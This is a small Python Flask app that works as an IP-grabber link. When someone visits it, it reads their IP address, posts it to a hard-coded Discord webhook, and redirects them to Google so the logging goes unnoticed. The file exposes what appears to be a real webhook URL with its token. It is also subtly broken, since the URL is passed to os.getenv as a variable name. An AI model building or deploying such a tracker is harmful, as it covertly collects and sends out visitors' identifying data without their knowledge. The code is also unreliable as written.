import os
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Use an environment variable for the Discord webhook URL
WEBHOOK_URL = os.getenv('https://discord.com/api/webhooks/1308922267551404092/g1Wn9zSGb535ddZY90WKPqbjrbKYelA1KSu965vxNwIEr-Gf2StfyrY-Pmpvr_GeUSvk')

@app.route('/')
def index():
    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    if WEBHOOK_URL:
        send_ip(ip)
    else:
        app.logger.warning("Webhook URL is not set.")
    return redirect('https://www.google.com')

def send_ip(ip):
    try:
        data = {
            'content': f'IP Address: {ip}'
        }
        response = requests.post(WEBHOOK_URL, json=data)
        response.raise_for_status()  # Raise an error for bad status codes
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Error sending IP to Discord: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
